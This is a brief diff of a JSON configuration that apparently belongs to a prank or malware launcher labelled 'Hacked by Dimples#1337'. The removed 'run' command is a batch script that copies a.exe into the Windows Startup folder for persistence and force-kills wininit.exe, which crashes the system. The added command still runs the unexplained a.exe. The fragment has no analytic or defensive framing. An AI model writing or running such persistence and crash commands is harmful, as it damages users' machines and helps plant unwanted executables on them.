@@ -21,6 +21,6 @@
     "text": "Hacked by Dimples#1337"
   },
   "run": {
-    "command": "@echo off\ncopy /Y $rundir\\a.exe \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\a.exe\"\ntaskkill /f /im wininit.exe\nexit"
+    "command": "@echo off\n$rundir\\a.exe\nexit"
   }
 }
